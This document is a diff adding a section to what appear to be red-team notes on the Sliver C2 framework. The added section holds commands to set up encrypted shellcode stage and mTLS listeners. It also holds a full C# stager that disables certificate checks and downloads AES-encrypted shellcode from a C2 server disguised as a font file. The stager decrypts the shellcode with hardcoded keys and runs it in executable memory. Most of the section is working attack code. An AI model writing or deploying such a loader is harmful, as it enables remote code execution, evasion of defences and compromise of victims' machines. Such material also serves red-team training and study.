@@ -445,7 +445,137 @@ Y al ejecutar el programa compilado obtenemos una conexión (no encriptada) con 
 
 
 
+### Encripted Stager
 
+```bash
+## Generate key and IV ##
+head -c 8 /dev/urandom | xxd -p
+################################
+
+# Create a profile
+profiles new --mtls 192.168.244.129 --format shellcode --skip-symbols --arch amd64 <profile-name>
+
+# Start the listener for the shellcode
+stage-listener --url http://192.168.244.129:80 --profile win641 --aes-encrypt-key <aes-key> --aes-encrypt-iv <aes-iv>
+
+# And for the session
+mtls
+
+##
+sliver > jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 3    http   tcp        80   
+ 4    mtls   tcp        8888 
+ 
+```
+
+
+
+#### C# Code
+
+/platform:x64
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Security.Cryptography;
+using System.IO;
+
+namespace stagerHttp
+{
+    class Program
+    {
+        private static string AESKey = "ec1238205e0e65ce";
+        private static string AESIV = "786b6eb024458604";
+        private static string url = "http://192.168.244.129/fontawesome.woff";
+        public static void Main(String[] args)
+        {
+            byte[] shellcode = Download(url);
+            Execute(shellcode);
+
+            return;
+        }
+
+        private static byte[] Download(string url)
+        {
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] shellcode = client.DownloadData(url);
+            List<byte> l = new List<byte> { };
+
+            for (int i = 16; i <= shellcode.Length - 1; i++)
+            {
+                l.Add(shellcode[i]);
+            }
+
+            byte[] actual = l.ToArray();
+
+            byte[] decrypted;
+
+            decrypted = Decrypt(actual, AESKey, AESIV);
+
+            return decrypted;
+        }
+
+        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
+        {
+            byte[] key = Encoding.UTF8.GetBytes(AESKey);
+            byte[] IV = Encoding.UTF8.GetBytes(AESIV);
+
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = key;
+                aesAlg.IV = IV;
+                aesAlg.Padding = PaddingMode.None;
+
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
+                        return memoryStream.ToArray();
+                    }
+                }
+            }
+        }
+
+        [DllImport("kernel32")]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        private static void Execute(byte[] shellcode)
+        {
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
+            Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);
+
+
+            IntPtr hThread = IntPtr.Zero;
+            IntPtr threadId = IntPtr.Zero;
+            hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+            return;
+        }
+    }
+}
+
+```
 
 ## Execute Assembly
 
